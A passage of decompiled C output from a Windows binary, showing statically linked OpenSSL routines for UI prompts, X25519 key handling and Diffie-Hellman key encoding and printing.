        v5 = sub_426A40(*(int **)(a1 + 4), v4);
        if ( !(*(int (__cdecl **)(int, int))(*(_DWORD *)a1 + 8))(a1, v5) )
          break;
      }
      if ( ++v4 >= sub_426A30(*(_DWORD *)(a1 + 4)) )
        goto LABEL_10;
    }
LABEL_21:
    v2 = -1;
    goto LABEL_23;
  }
LABEL_10:
  v6 = *(int (__cdecl **)(int))(*(_DWORD *)a1 + 12);
  if ( v6 )
  {
    v7 = v6(a1);
    if ( v7 == -1 )
    {
LABEL_22:
      v2 = -2;
      goto LABEL_23;
    }
    if ( !v7 )
      goto LABEL_21;
    v2 = 0;
  }
  for ( i = 0; i < sub_426A30(*(_DWORD *)(a1 + 4)); ++i )
  {
    if ( *(_DWORD *)(*(_DWORD *)a1 + 16) )
    {
      v9 = sub_426A40(*(int **)(a1 + 4), i);
      v10 = (*(int (__cdecl **)(int, int))(*(_DWORD *)a1 + 16))(a1, v9);
      if ( v10 == -1 )
        goto LABEL_22;
      if ( !v10 )
        goto LABEL_21;
      v2 = 0;
    }
  }
LABEL_23:
  v11 = *(int (__cdecl **)(int))(*(_DWORD *)a1 + 20);
  if ( v11 && !v11(a1) )
    return -1;
  return v2;
}

//----- (00445DB0) --------------------------------------------------------
int __cdecl sub_445DB0(int a1)
{
  int result; // eax

  result = a1;
  if ( a1 )
    return *(_DWORD *)a1;
  return result;
}

//----- (00445DC0) --------------------------------------------------------
int __cdecl sub_445DC0(int a1)
{
  int result; // eax

  result = a1;
  if ( a1 )
    return *(_DWORD *)(a1 + 8);
  return result;
}

//----- (00445DD0) --------------------------------------------------------
int __cdecl sub_445DD0(int a1)
{
  int result; // eax

  result = a1;
  if ( a1 )
    return *(_DWORD *)(a1 + 4);
  return result;
}

//----- (00445DE0) --------------------------------------------------------
int __cdecl sub_445DE0(_DWORD *a1)
{
  if ( a1 && (*a1 == 1 || *a1 == 3) )
    return a1[4];
  else
    return 0;
}

//----- (00445E00) --------------------------------------------------------
int __cdecl sub_445E00(_DWORD *a1)
{
  if ( a1 && (unsigned int)(*a1 - 1) <= 1 )
    return a1[3];
  else
    return 0;
}

//----- (00445E20) --------------------------------------------------------
int __cdecl sub_445E20(_DWORD *a1)
{
  if ( a1 && *a1 == 2 )
    return a1[6];
  else
    return 0;
}

//----- (00445E40) --------------------------------------------------------
int __cdecl sub_445E40(int a1, int a2, const char *a3)
{
  const char *v3; // edi
  signed int v4; // ebp
  int v5; // eax
  _BYTE *v6; // eax
  int result; // eax
  signed int v8; // eax
  char *v9; // esi
  char v10[16]; // [esp+10h] [ebp-24h] BYREF
  char v11[16]; // [esp+20h] [ebp-14h] BYREF

  v3 = a3;
  v4 = strlen(a3);
  *(_DWORD *)(a1 + 16) &= ~1u;
  if ( !a2 )
    return -1;
  v5 = *(_DWORD *)a2;
  if ( *(int *)a2 <= 0 )
    return 0;
  if ( v5 <= 2 )
  {
    sub_4191B0((int)v11, 13, "%d", *(_DWORD *)(a2 + 16));
    sub_4191B0((int)v10, 13, "%d", *(_DWORD *)(a2 + 20));
    if ( v4 < *(_DWORD *)(a2 + 16) )
    {
      *(_DWORD *)(a1 + 16) |= 1u;
      sub_408310(40, 105, 101, (int)"crypto\\ui\\ui_lib.c", 778);
      sub_408610(5, "You must type in ", v11, " to ", v10, " characters");
      return -1;
    }
    v8 = *(_DWORD *)(a2 + 20);
    if ( v4 > v8 )
    {
      *(_DWORD *)(a1 + 16) |= 1u;
      sub_408310(40, 105, 100, (int)"crypto\\ui\\ui_lib.c", 785);
      sub_408610(5, "You must type in ", v11, " to ", v10, " characters");
      return -1;
    }
    v9 = *(char **)(a2 + 12);
    if ( !v9 )
    {
      sub_408310(40, 105, 105, (int)"crypto\\ui\\ui_lib.c", 793);
      return -1;
    }
    sub_424880(v9, a3, v8 + 1);
    return 0;
  }
  if ( v5 != 3 )
    return 0;
  v6 = *(_BYTE **)(a2 + 12);
  if ( !v6 )
  {
    sub_408310(40, 105, 105, (int)"crypto\\ui\\ui_lib.c", 805);
    return -1;
  }
  *v6 = 0;
  if ( !*a3 )
    return 0;
  while ( 1 )
  {
    if ( strchr(*(const char **)(a2 + 20), *v3) )
    {
      **(_BYTE **)(a2 + 12) = **(_BYTE **)(a2 + 20);
      return 0;
    }
    result = (int)strchr(*(const char **)(a2 + 24), *v3);
    if ( result )
      break;
    if ( !*++v3 )
      return result;
  }
  **(_BYTE **)(a2 + 12) = **(_BYTE **)(a2 + 24);
  return 0;
}

//----- (00446040) --------------------------------------------------------
int **__cdecl sub_446040(char **a1)
{
  int **v1; // esi
  struct _RTL_CRITICAL_SECTION *v3; // eax
  char **v4; // eax

  v1 = (int **)sub_413430(0x18u);
  if ( v1 )
  {
    v3 = sub_414650();
    v1[5] = (int *)v3;
    if ( v3 )
    {
      v4 = a1;
      if ( !a1 )
      {
        v4 = (char **)dword_539264;
        if ( !dword_539264 )
        {
          v4 = sub_472520();
          dword_539264 = (int)v4;
        }
      }
      *v1 = (int *)v4;
      if ( sub_414B00(0xBu, (int)v1, v1 + 3) )
      {
        return v1;
      }
      else
      {
        sub_413490(v1);
        return 0;
      }
    }
    else
    {
      sub_408310(40, 104, 65, (int)"crypto\\ui\\ui_lib.c", 36);
      sub_413490(v1);
      return 0;
    }
  }
  else
  {
    sub_408310(40, 104, 65, (int)"crypto\\ui\\ui_lib.c", 30);
    return 0;
  }
}
// 539264: using guessed type int dword_539264;

//----- (004460F0) --------------------------------------------------------
int **sub_4460F0()
{
  return sub_446040(0);
}

//----- (00446100) --------------------------------------------------------
int __fastcall sub_446100(int a1, const void *a2, int a3, _DWORD *a4, size_t Size)
{
  void **v8; // eax
  void **v9; // ebx
  void *v10; // eax
  int v11; // [esp+Ch] [ebp-4h] BYREF

  if ( a1 != 2 )
  {
    if ( a4 )
    {
      sub_42C7D0(0, &v11, 0, a4);
      if ( v11 != -1 )
      {
        sub_408310(16, 266, 102, (int)"crypto\\ec\\ecx_meth.c", 47);
        return 0;
      }
    }
    if ( !a2 || Size != 32 )
    {
      sub_408310(16, 266, 102, (int)"crypto\\ec\\ecx_meth.c", 53);
      return 0;
    }
  }
  v8 = (void **)sub_413430(0x24u);
  v9 = v8;
  if ( !v8 )
  {
    sub_408310(16, 266, 65, (int)"crypto\\ec\\ecx_meth.c", 60);
    return 0;
  }
  if ( a1 )
  {
    v10 = (void *)sub_42ABD0(0x20u);
    v9[8] = v10;
    if ( !v10 )
    {
      sub_408310(16, 266, 65, (int)"crypto\\ec\\ecx_meth.c", 69);
      sub_413490(v9);
      return 0;
    }
    if ( a1 == 2 )
    {
      if ( sub_406FF0() <= 0 )
      {
        sub_42AC10(v9[8]);
        sub_413490(v9);
        return 0;
      }
      *(_BYTE *)v9[8] &= 0xF8u;
      *((_BYTE *)v9[8] + 31) &= ~0x80u;
      *((_BYTE *)v9[8] + 31) |= 0x40u;
    }
    else
    {
      qmemcpy(v10, a2, 0x20u);
    }
    sub_477CC0((int)v9, v9[8]);
  }
  else
  {
    memcpy(v8, a2, Size);
  }
  sub_41CE20(a3, (void *)0x40A, (int)v9);
  return 1;
}

//----- (00446280) --------------------------------------------------------
int __cdecl sub_446280(int *a1, int a2)
{
  void *v2; // eax
  void *v4; // eax
  void *v5; // esi
  char **v6; // eax
  int v7; // [esp-Ch] [ebp-Ch]

  v2 = *(void **)(a2 + 20);
  if ( v2 )
  {
    v4 = sub_424800(v2, 0x20u);
    v5 = v4;
    if ( v4 )
    {
      v7 = (int)v4;
      v6 = sub_423310(0x40Au);
      if ( sub_41D4E0(a1, (int)v6, -1, 0, v7, 32) )
      {
        return 1;
      }
      else
      {
        sub_413490(v5);
        sub_408310(16, 268, 65, (int)"crypto\\ec\\ecx_meth.c", 111);
        return 0;
      }
    }
    else
    {
      sub_408310(16, 268, 65, (int)"crypto\\ec\\ecx_meth.c", 104);
      return 0;
    }
  }
  else
  {
    sub_408310(16, 268, 116, (int)"crypto\\ec\\ecx_meth.c", 98);
    return 0;
  }
}

//----- (00446340) --------------------------------------------------------
int __cdecl sub_446340(int a1, int a2)
{
  int result; // eax
  size_t Size; // [esp+0h] [ebp-Ch] BYREF
  int v4; // [esp+4h] [ebp-8h] BYREF
  const void *v5; // [esp+8h] [ebp-4h] BYREF

  result = sub_41D550(0, &v5, &Size, &v4, a2);
  if ( result )
    return sub_446100(0, v5, a1, (_DWORD *)v4, Size);
  return result;
}

//----- (00446390) --------------------------------------------------------
int __cdecl sub_446390(int a1, int a2)
{
  char *v2; // eax
  _BYTE *v3; // ecx

  v2 = *(char **)(a1 + 20);
  v3 = *(_BYTE **)(a2 + 20);
  if ( v2 && v3 )
    return sub_413A50(v2, v3, 32) == 0;
  else
    return -2;
}

//----- (004463C0) --------------------------------------------------------
int __cdecl sub_4463C0(int a1, int a2)
{
  int result; // eax
  int v3; // eax
  void *v4; // esi
  int v5; // edi
  void *v6; // [esp+0h] [ebp-Ch] BYREF
  int v7; // [esp+4h] [ebp-8h] BYREF
  int v8; // [esp+8h] [ebp-4h] BYREF

  result = sub_434BD0(0, (int *)&v6, &v7, &v8, a2);
  if ( result )
  {
    v3 = sub_42C3F0(0, &v6, v7);
    v4 = (void *)v3;
    if ( v3 )
    {
      v6 = (void *)sub_432B60(v3);
      v3 = sub_435D30((int)v4);
    }
    else
    {
      v6 = 0;
    }
    v7 = v3;
    v5 = sub_446100(1, v6, a1, (_DWORD *)v8, v3);
    sub_42C4F0(v4);
    return v5;
  }
  return result;
}

//----- (00446460) --------------------------------------------------------
int __cdecl sub_446460(int *a1, _DWORD *Block)
{
  int v2; // eax
  int v3; // eax
  int v4; // esi
  char **v6; // eax
  int v7; // [esp-Ch] [ebp-1Ch]
  int v8[4]; // [esp+0h] [ebp-10h] BYREF

  v2 = Block[5];
  Block = 0;
  if ( v2 && (v3 = *(_DWORD *)(v2 + 32)) != 0 )
  {
    v8[2] = v3;
    v8[0] = 32;
    v8[3] = 0;
    v4 = sub_42C410((int)v8, (void **)&Block);
    if ( v4 >= 0 )
    {
      v7 = (int)Block;
      v6 = sub_423310(0x40Au);
      if ( sub_434B60(a1, (int)v6, 0, -1, 0, v7, v4) )
      {
        return 1;
      }
      else
      {
        sub_4134B0(Block, v4);
        sub_408310(16, 267, 65, (int)"crypto\\ec\\ecx_meth.c", 188);
        return 0;
      }
    }
    else
    {
      sub_408310(16, 267, 65, (int)"crypto\\ec\\ecx_meth.c", 181);
      return 0;
    }
  }
  else
  {
    sub_408310(16, 267, 123, (int)"crypto\\ec\\ecx_meth.c", 171);
    return 0;
  }
}

//----- (00446570) --------------------------------------------------------
int sub_446570()
{
  return 253;
}

//----- (00446580) --------------------------------------------------------
int sub_446580()
{
  return 128;
}

//----- (00446590) --------------------------------------------------------
void __cdecl sub_446590(int a1)
{
  void **v1; // esi

  v1 = *(void ***)(a1 + 20);
  if ( v1 )
    sub_42AC10(v1[8]);
  sub_413490(v1);
}

//----- (004465D0) --------------------------------------------------------
BOOL __usercall sub_4465D0@<eax>(int a1@<ecx>, int a2@<edi>, int a3, int a4)
{
  int v4; // ebx

  v4 = *(_DWORD *)(a3 + 20);
  if ( a4 == 1 )
  {
    if ( !v4 || !*(_DWORD *)(v4 + 32) )
      return sub_419190(a2, "%*s<INVALID PRIVATE KEY>\n", a1, byte_4F1291) > 0;
    if ( sub_419190(a2, "%*sX25519 Private-Key:\n", a1, byte_4F1291) <= 0
      || sub_419190(a2, "%*spriv:\n", a1, byte_4F1291) <= 0
      || !sub_477ED0(a2, *(_DWORD *)(v4 + 32), 0x20u, a1 + 4) )
    {
      return 0;
    }
  }
  else
  {
    if ( !v4 )
      return sub_419190(a2, "%*s<INVALID PUBLIC KEY>\n", a1, byte_4F1291) > 0;
    if ( sub_419190(a2, "%*sX25519 Public-Key:\n", a1, byte_4F1291) <= 0 )
      return 0;
  }
  if ( sub_419190(a2, "%*spub:\n", a1, byte_4F1291) <= 0 )
    return 0;
  return sub_477ED0(a2, v4, 0x20u, a1 + 4);
}

//----- (004466C0) --------------------------------------------------------
BOOL __cdecl sub_4466C0(int a1, int a2, int a3)
{
  return sub_4465D0(a3, a1, a2, 1);
}

//----- (004466E0) --------------------------------------------------------
BOOL __cdecl sub_4466E0(int a1, int a2, int a3)
{
  int v3; // ebx

  v3 = *(_DWORD *)(a2 + 20);
  if ( !v3 )
    return sub_419190(a1, "%*s<INVALID PUBLIC KEY>\n", a3, byte_4F1291) > 0;
  if ( sub_419190(a1, "%*sX25519 Public-Key:\n", a3, byte_4F1291) > 0
    && sub_419190(a1, "%*spub:\n", a3, byte_4F1291) > 0 )
  {
    return sub_477ED0(a1, v3, 0x20u, a3 + 4);
  }
  return 0;
}

//----- (00446770) --------------------------------------------------------
int __cdecl sub_446770(int a1, int a2, int a3, _DWORD *Src)
{
  void *v5; // eax
  void *v6; // eax
  void *v7; // eax
  int v8; // esi

  switch ( a2 )
  {
    case 3:
      *Src = 672;
      return 2;
    case 9:
      if ( Src && a3 == 32 )
      {
        v7 = sub_413430(0x24u);
        v8 = (int)v7;
        if ( v7 )
        {
          memcpy(v7, Src, 0x20u);
          sub_41CE20(a1, (void *)0x40A, v8);
          return 1;
        }
        sub_408310(16, 266, 65, (int)"crypto\\ec\\ecx_meth.c", 60);
      }
      else
      {
        sub_408310(16, 266, 102, (int)"crypto\\ec\\ecx_meth.c", 53);
      }
      return 0;
    case 10:
      v5 = *(void **)(a1 + 20);
      if ( v5 && (v6 = sub_424800(v5, 0x20u), (*Src = v6) != 0) )
        return 32;
      else
        return 0;
    default:
      return -2;
  }
}

//----- (00446850) --------------------------------------------------------
int __cdecl sub_446850(int a1, int a2)
{
  const void **v2; // esi
  int v4; // eax
  bool v5; // cc
  _BYTE *v6; // eax

  v2 = (const void **)sub_413430(0x24u);
  if ( v2 )
  {
    v4 = sub_42ABD0(0x20u);
    v2[8] = (const void *)v4;
    if ( v4 )
    {
      v5 = sub_406FF0() <= 0;
      v6 = v2[8];
      if ( v5 )
      {
        sub_42AC10(v6);
        sub_413490(v2);
        return 0;
      }
      else
      {
        *v6 &= 0xF8u;
        *((_BYTE *)v2[8] + 31) &= ~0x80u;
        *((_BYTE *)v2[8] + 31) |= 0x40u;
        sub_477CC0((int)v2, v2[8]);
        sub_41CE20(a2, (void *)0x40A, (int)v2);
        return 1;
      }
    }
    else
    {
      sub_408310(16, 266, 65, (int)"crypto\\ec\\ecx_meth.c", 69);
      sub_413490(v2);
      return 0;
    }
  }
  else
  {
    sub_408310(16, 266, 65, (int)"crypto\\ec\\ecx_meth.c", 60);
    return 0;
  }
}

//----- (00446930) --------------------------------------------------------
int __cdecl sub_446930(int a1, _BYTE *a2, _DWORD *a3)
{
  int v3; // eax
  int v4; // ecx
  int v5; // eax
  unsigned __int8 *v6; // ecx

  v3 = *(_DWORD *)(a1 + 8);
  if ( v3 && (v4 = *(_DWORD *)(a1 + 12)) != 0 )
  {
    v5 = *(_DWORD *)(v3 + 20);
    v6 = *(unsigned __int8 **)(v4 + 20);
    if ( !v5 || !*(_DWORD *)(v5 + 32) )
    {
      sub_408310(16, 269, 123, (int)"crypto\\ec\\ecx_meth.c", 344);
      return 0;
    }
    if ( !v6 )
    {
      sub_408310(16, 269, 133, (int)"crypto\\ec\\ecx_meth.c", 348);
      return 0;
    }
    *a3 = 32;
    if ( !a2 || sub_477C90(a2, *(const void **)(v5 + 32), v6) )
      return 1;
  }
  else
  {
    sub_408310(16, 269, 140, (int)"crypto\\ec\\ecx_meth.c", 338);
  }
  return 0;
}

//----- (004469F0) --------------------------------------------------------
int __cdecl sub_4469F0(int a1, int a2)
{
  return a2 != 2 ? -2 : 1;
}

//----- (00446A00) --------------------------------------------------------
void __cdecl sub_446A00(volatile LONG **Block)
{
  sub_4346C0(Block[5]);
}

//----- (00446A10) --------------------------------------------------------
int __cdecl sub_446A10(int a1, int a2)
{
  int v2; // esi
  void *v3; // edi
  int result; // eax
  bool v5; // zf
  int v6; // eax
  int v7; // eax
  int v8; // eax
  int v9; // [esp-8h] [ebp-28h]
  int v10; // [esp+8h] [ebp-18h] BYREF
  _DWORD *v11; // [esp+Ch] [ebp-14h] BYREF
  int v12; // [esp+10h] [ebp-10h] BYREF
  int *v13; // [esp+14h] [ebp-Ch] BYREF
  int v14; // [esp+18h] [ebp-8h] BYREF
  void *v15; // [esp+1Ch] [ebp-4h] BYREF

  v2 = 0;
  v3 = 0;
  result = sub_41D550(0, &v15, &v14, &v11, a2);
  if ( result )
  {
    sub_42C7D0(0, &v12, &v13, v11);
    if ( v12 != 16 )
    {
      sub_408310(5, 108, 105, (int)"crypto\\dh\\dh_ameth.c", 62);
LABEL_13:
      sub_42C4F0(v3);
      sub_4346C0((volatile LONG *)v2);
      return 0;
    }
    v5 = *(_DWORD *)(a1 + 12) == (_DWORD)&unk_50CF70;
    v10 = v13[2];
    v9 = *v13;
    if ( v5 )
      v6 = sub_4202F0(0, (void **)&v10, v9);
    else
      v6 = sub_4202A0(0, (void **)&v10, v9);
    v2 = v6;
    if ( !v6 )
    {
      sub_408310(5, 108, 104, (int)"crypto\\dh\\dh_ameth.c", 71);
      goto LABEL_13;
    }
    v7 = sub_42C450(0, &v15, v14);
    v3 = (void *)v7;
    if ( !v7 )
    {
      sub_408310(5, 108, 104, (int)"crypto\\dh\\dh_ameth.c", 76);
      goto LABEL_13;
    }
    v8 = sub_4318D0(v7, 0);
    *(_DWORD *)(v2 + 20) = v8;
    if ( !v8 )
    {
      sub_408310(5, 108, 109, (int)"crypto\\dh\\dh_ameth.c", 82);
      goto LABEL_13;
    }
    sub_42C4F0(v3);
    sub_41CE20(a1, **(void ***)(a1 + 12), v2);
    return 1;
  }
  return result;
}

//----- (00446B50) --------------------------------------------------------
int __cdecl sub_446B50(int *a1, int a2)
{
  int v2; // edi
  void **v3; // esi
  signed int v5; // eax
  _DWORD *v6; // eax
  void *v7; // edi
  int v8; // ebx
  char **v9; // eax
  void *v10; // [esp-8h] [ebp-1Ch]
  void **v11; // [esp-4h] [ebp-18h]
  void *Block; // [esp+10h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(a2 + 20);
  Block = 0;
  v3 = (void **)sub_432DC0();
  if ( !v3 )
  {
    sub_408310(5, 109, 65, (int)"crypto\\dh\\dh_ameth.c", 110);
LABEL_3:
    sub_413490(Block);
    sub_432A30(v3);
    return 0;
  }
  v11 = v3 + 2;
  if ( *(_UNKNOWN **)(a2 + 12) == &unk_50CF70 )
    v5 = sub_4203D0((_DWORD *)v2, v11);
  else
    v5 = sub_4202C0(v2, v11);
  *v3 = (void *)v5;
  if ( v5 <= 0 )
  {
    sub_408310(5, 109, 65, (int)"crypto\\dh\\dh_ameth.c", 115);
    goto LABEL_3;
  }
  v6 = sub_4318B0(*(_DWORD **)(v2 + 20), 0);
  v7 = v6;
  if ( !v6 )
    goto LABEL_3;
  v8 = sub_42C470((int)v6, &Block);
  sub_42C4F0(v7);
  if ( v8 <= 0 )
  {
    sub_408310(5, 109, 65, (int)"crypto\\dh\\dh_ameth.c", 129);
    goto LABEL_3;
  }
  v10 = Block;
  v9 = sub_423310(**(_DWORD **)(a2 + 12));
  if ( !sub_41D4E0(a1, (int)v9, 16, (int)v3, (int)v10, v8) )
    goto LABEL_3;
  return 1;
}

//----- (00446C50) --------------------------------------------------------
int __cdecl sub_446C50(int a1, int a2)
{
  int v2; // esi
  void *v3; // edi
  int result; // eax
  bool v5; // zf
  int v6; // eax
  _DWORD *v7; // eax
  int v8; // [esp-8h] [ebp-28h]
  int v9; // [esp+8h] [ebp-18h] BYREF
  _DWORD *v10; // [esp+Ch] [ebp-14h] BYREF
  int v11; // [esp+10h] [ebp-10h] BYREF
  int v12; // [esp+14h] [ebp-Ch] BYREF
  void *v13; // [esp+18h] [ebp-8h] BYREF
  int *v14; // [esp+1Ch] [ebp-4h] BYREF

  v2 = 0;
  v3 = 0;
  result = sub_434BD0(0, (int *)&v13, &v12, &v10, a2);
  if ( result )
  {
    sub_42C7D0(0, &v11, &v14, v10);
    if ( v11 == 16
      && (v3 = (void *)sub_42C450(0, &v13, v12)) != 0
      && ((v5 = *(_DWORD *)(a1 + 12) == (_DWORD)&unk_50CF70, v9 = v14[2], v8 = *v14, !v5)
        ? (v6 = sub_4202A0(0, (void **)&v9, v8))
        : (v6 = sub_4202F0(0, (void **)&v9, v8)),
          (v2 = v6) != 0) )
    {
      v7 = sub_416900();
      *(_DWORD *)(v2 + 24) = v7;
      if ( v7 && sub_4318D0((int)v3, (int)v7) )
      {
        if ( sub_4559C0(v2) )
        {
          sub_41CE20(a1, **(void ***)(a1 + 12), v2);
          sub_432A70(v3);
          return 1;
        }
      }
      else
      {
        sub_408310(5, 110, 106, (int)"crypto\\dh\\dh_ameth.c", 181);
      }
    }
    else
    {
      sub_408310(5, 110, 114, (int)"crypto\\dh\\dh_ameth.c", 195);
    }
    sub_4346C0((volatile LONG *)v2);
    sub_432A70(v3);
    return 0;
  }
  return result;
}

//----- (00446D90) --------------------------------------------------------
int __cdecl sub_446D90(int *a1, int a2)
{
  void **v2; // esi
  signed int v3; // eax
  _DWORD *v4; // eax
  void *v5; // edi
  int v6; // ebp
  char **v7; // eax
  void *v9; // [esp-Ch] [ebp-1Ch]
  _DWORD *v10; // [esp-8h] [ebp-18h]
  void **v11; // [esp-4h] [ebp-14h]
  void *Block; // [esp+Ch] [ebp-4h] BYREF

  Block = 0;
  v2 = (void **)sub_432DC0();
  if ( !v2 )
  {
    sub_408310(5, 111, 65, (int)"crypto\\dh\\dh_ameth.c", 212);
    goto LABEL_12;
  }
  v11 = v2 + 2;
  v10 = *(_DWORD **)(a2 + 20);
  if ( *(_UNKNOWN **)(a2 + 12) == &unk_50CF70 )
    v3 = sub_4203D0(v10, v11);
  else
    v3 = sub_4202C0((int)v10, v11);
  *v2 = (void *)v3;
  if ( v3 <= 0 )
  {
    sub_408310(5, 111, 65, (int)"crypto\\dh\\dh_ameth.c", 218);
LABEL_12:
    sub_413490(Block);
    sub_432A30(v2);
    sub_432A70(0);
    return 0;
  }
  v2[1] = (void *)16;
  v4 = sub_4318B0(*(_DWORD **)(*(_DWORD *)(a2 + 20) + 24), 0);
  v5 = v4;
  if ( !v4 )
  {
    sub_408310(5, 111, 106, (int)"crypto\\dh\\dh_ameth.c", 227);
    goto LABEL_12;
  }
  v6 = sub_42C470((int)v4, &Block);
  sub_432A70(v5);
  v9 = Block;
  v7 = sub_423310(**(_DWORD **)(a2 + 12));
  if ( !sub_434B60(a1, (int)v7, 0, 16, (int)v2, (int)v9, v6) )
    goto LABEL_12;
  return 1;
}

//----- (00446EB0) --------------------------------------------------------
int __cdecl sub_446EB0(int a1, void **a2, int a3)
{
  int v3; // eax

  if ( *(_UNKNOWN **)(a1 + 12) == &unk_50CF70 )
    v3 = sub_4202F0(0, a2, a3);
  else
    v3 = sub_4202A0(0, a2, a3);
  if ( v3 )
  {
    sub_41CE20(a1, **(void ***)(a1 + 12), v3);
    return 1;
  }
  else
  {
    sub_408310(5, 107, 5, (int)"crypto\\dh\\dh_ameth.c", 255);
    return 0;
  }
}

//----- (00446F20) --------------------------------------------------------
signed int __cdecl sub_446F20(int a1, void **a2)
{
  if ( *(_UNKNOWN **)(a1 + 12) == &unk_50CF70 )
    return sub_4203D0(*(_DWORD **)(a1 + 20), a2);
  else
    return sub_4202C0(*(_DWORD *)(a1 + 20), a2);
}

//----- (00446F50) --------------------------------------------------------
int __usercall sub_446F50@<eax>(int a1@<ebx>, int a2@<edi>, int a3, void *Block)
{
  const char *v6; // esi
  int v7; // eax
  int v8; // ebp
  _DWORD *v9; // eax
  _DWORD *v10; // eax
  int v11; // esi
  const char *v12; // eax
  _DWORD *v13; // eax
  _DWORD *v14; // [esp+8h] [ebp-8h]
  __int16 v15; // [esp+Ch] [ebp-4h]
  _DWORD *Blocka; // [esp+18h] [ebp+8h]
  void *Blockb; // [esp+18h] [ebp+8h]

  v15 = 7;
  if ( Block == (void *)2 )
  {
    Blocka = *(_DWORD **)(a1 + 24);
    v14 = *(_DWORD **)(a1 + 20);
  }
  else
  {
    Blocka = 0;
    if ( (int)Block <= 0 )
      v14 = 0;
    else
      v14 = *(_DWORD **)(a1 + 20);
  }
  if ( !*(_DWORD *)(a1 + 8) )
    goto LABEL_9;
  if ( Block == (void *)2 )
  {
    if ( !Blocka )
    {
LABEL_9:
      v15 = 67;
      goto LABEL_10;
    }
  }
  else if ( (int)Block <= 0 )
  {
    goto LABEL_14;
  }
  if ( !v14 )
    goto LABEL_9;
LABEL_14:
  if ( Block == (void *)2 )
  {
    v6 = "DH Private-Key";
  }
  else
  {
    v6 = "DH Public-Key";
    if ( Block != (void *)1 )
      v6 = "DH Parameters";
  }
  sub_405340(a2, a3, 128);
  v7 = sub_416F90(*(_DWORD **)(a1 + 8));
  if ( sub_419190(a2, "%s: (%d bit)\n", v6, v7) <= 0 )
    goto LABEL_10;
  v8 = a3 + 4;
  if ( !sub_477F80(a2, "private-key:", Blocka, 0, a3 + 4) )
    goto LABEL_10;
  if ( !sub_477F80(a2, "public-key:", v14, 0, v8) )
    goto LABEL_10;
  if ( !sub_477F80(a2, "prime:", *(_DWORD **)(a1 + 8), 0, v8) )
    goto LABEL_10;
  if ( !sub_477F80(a2, "generator:", *(_DWORD **)(a1 + 12), 0, v8) )
    goto LABEL_10;
  v9 = *(_DWORD **)(a1 + 36);
  if ( v9 )
  {
    if ( !sub_477F80(a2, "subgroup order:", v9, 0, v8) )
      goto LABEL_10;
  }
  v10 = *(_DWORD **)(a1 + 40);
  if ( v10 )
  {
    if ( !sub_477F80(a2, "subgroup factor:", v10, 0, v8) )
      goto LABEL_10;
  }
  if ( *(_DWORD *)(a1 + 44) )
  {
    sub_405340(a2, v8, 128);
    sub_4051D0(a2, (int)"seed:");
    v11 = 0;
    if ( *(int *)(a1 + 48) > 0 )
    {
      while ( v11 % 15 || sub_4051D0(a2, (int)"\n") > 0 && sub_405340(a2, a3 + 8, 128) )
      {
        Blockb = (void *)(v11 + 1);
        v12 = byte_4F1291;
        if ( v11 + 1 != *(_DWORD *)(a1 + 48) )
          v12 = word_4F1980;
        if ( sub_419190(a2, "%02x%s", *(unsigned __int8 *)(*(_DWORD *)(a1 + 44) + v11), v12) <= 0 )
          break;
        ++v11;
        if ( (int)Blockb >= *(_DWORD *)(a1 + 48) )
          goto LABEL_36;
      }
      goto LABEL_10;
    }
LABEL_36:
    if ( sub_405110(a2, (int)"\n", 1) <= 0 )
      return 0;
  }
  if ( (v13 = *(_DWORD **)(a1 + 52)) != 0 && !sub_477F80(a2, "counter:", v13, 0, v8)
    || *(_DWORD *)(a1 + 16)
    && (sub_405340(a2, v8, 128), sub_419190(a2, "recommended-private-length: %d bits\n", *(_DWORD *)(a1 + 16)) <= 0) )
  {
LABEL_10:
    sub_408310(5, 100, v15, (int)"crypto\\dh\\dh_ameth.c", 343);
    return 0;
  }
  return 1;
}

//----- (00447220) --------------------------------------------------------
int __cdecl sub_447220(int a1)
{
  return sub_434790(*(_DWORD *)(a1 + 20));
}

//----- (00447230) --------------------------------------------------------
int __cdecl sub_447230(int a1)
{
  return sub_416F90(*(_DWORD **)(*(_DWORD *)(a1 + 20) + 8));
}

//----- (00447250) --------------------------------------------------------
int __cdecl sub_447250(int a1)
{
  int v1; // eax
  int v2; // eax
  int v4; // [esp-8h] [ebp-8h]
  int v5; // [esp+4h] [ebp+4h]

  v5 = *(_DWORD *)(a1 + 20);
  if ( *(_DWORD *)(v5 + 36) )
  {
    v1 = sub_416F90(*(_DWORD **)(v5 + 36));
  }
  else
  {
    v1 = *(_DWORD *)(v5 + 16);
    if ( !v1 )
      v1 = -1;
  }
  v4 = v1;
  v2 = sub_416F90(*(_DWORD **)(v5 + 8));
  return sub_416D10(v2, v4);
}

//----- (00447260) --------------------------------------------------------
BOOL __cdecl sub_447260(int a1, int a2)
{
  return !sub_4169B0(*(_DWORD **)(*(_DWORD *)(a1 + 20) + 8), *(_DWORD **)(*(_DWORD *)(a2 + 20) + 8))
      && !sub_4169B0(*(_DWORD **)(*(_DWORD *)(a1 + 20) + 12), *(_DWORD **)(*(_DWORD *)(a2 + 20) + 12))
      && (*(_UNKNOWN **)(a1 + 12) != &unk_50CF70
       || !sub_4169B0(*(_DWORD **)(*(_DWORD *)(a1 + 20) + 36), *(_DWORD **)(*(_DWORD *)(a2 + 20) + 36)));
}

//----- (004472D0) --------------------------------------------------------
void **__usercall sub_4472D0@<eax>(void ***a1@<edi>, int a2)
{
  void **result; // eax
  void **v3; // esi

  if ( !a2 )
  {
    v3 = 0;
    goto LABEL_5;
  }
  result = sub_4176D0(a2);
  v3 = result;
  if ( result )
  {
LABEL_5:
    sub_417060(*a1);
    *a1 = v3;
    return (void **)1;
  }
  return result;
}

//----- (00447300) --------------------------------------------------------
int __usercall sub_447300@<eax>(_DWORD *a1@<ebx>, int a2@<esi>, int a3)
{
  int v3; // eax
  void **v4; // edi
  void **v6; // edi
  void *v7; // eax
  void *v8; // eax

  if ( a3 == -1 )
    a3 = a1[9] != 0;
  v3 = a1[2];
  if ( v3 )
  {
    v4 = sub_4176D0(v3);
    if ( !v4 )
      return 0;
  }
  else
  {
    v4 = 0;
  }
  sub_417060(*(void ***)(a2 + 8));
  *(_DWORD *)(a2 + 8) = v4;
  if ( a1[3] )
  {
    v6 = sub_4176D0(a1[3]);
    if ( !v6 )
      return 0;
  }
  else
  {
    v6 = 0;
  }
  sub_417060(*(void ***)(a2 + 12));
  *(_DWORD *)(a2 + 12) = v6;
  if ( !a3 )
  {
    *(_DWORD *)(a2 + 16) = a1[4];
    return 1;
  }
  if ( !sub_4472D0((void ***)(a2 + 36), a1[9]) || !sub_4472D0((void ***)(a2 + 40), a1[10]) )
    return 0;
